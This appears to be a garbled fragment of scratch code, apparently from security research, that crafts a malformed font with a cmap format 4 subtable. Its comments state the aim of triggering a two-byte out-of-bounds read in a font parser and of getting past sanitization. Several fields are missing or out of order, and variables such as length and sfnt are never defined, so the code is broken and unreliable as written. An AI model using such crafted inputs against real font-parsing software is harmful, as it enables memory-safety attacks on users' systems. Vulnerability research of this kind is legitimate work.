# With segCount=1: glyphIdArrayLength = (length - 16 - 8)/2 = (length-24)/2

# collect_unicodes reads groups[i].startCharCode (4 bytes) and groups[i].endCharCode (4 bytes)

# So if numGroups is validated, no overflow. Unless sanitize is bypassed.

# Let me just try format 4 first and see what happens.

    # header: version(2) numTables(2)
    # encoding records: platformID(2) encodingID(2) offset(4)
    # subtable
    segCount = 1
    segCountX2 = 2
    # subtable content
    # format, length, language, segCountX2, searchRange, entrySelector, rangeShift
    # endCount[1], reservedPad, startCount[1], idDelta[1], idRangeOffset[1], glyphIdArray
    # Let's make length = 28

    sub += be16(4)  # format
    sub += be16(length)  # length
    sub += be16(0)  # language
    sub += be16(segCountX2)  # segCountX2
    sub += be16(0)  # searchRange
    sub += be16(0)  # entrySelector
    sub += be16(0)  # rangeShift
    sub += be16(0)  # endCount[0]
    sub += be16(0)  # reservedPad

    sub += be16(0)  # idDelta[0]

    # pad to length 28

    # Now sub is 28 bytes. glyphIdArrayLength = (28-24)/2 = 2.

    # glyphIdArray[1] is at byte offset 26+2=28 = length. OOB read of 2 bytes.

    cmap += be16(1)  # numTables
    cmap += be16(3)  # platformID (Windows)

    # table records: tag(4) checkSum(4) offset(4) length(4)

    sfnt += cmap
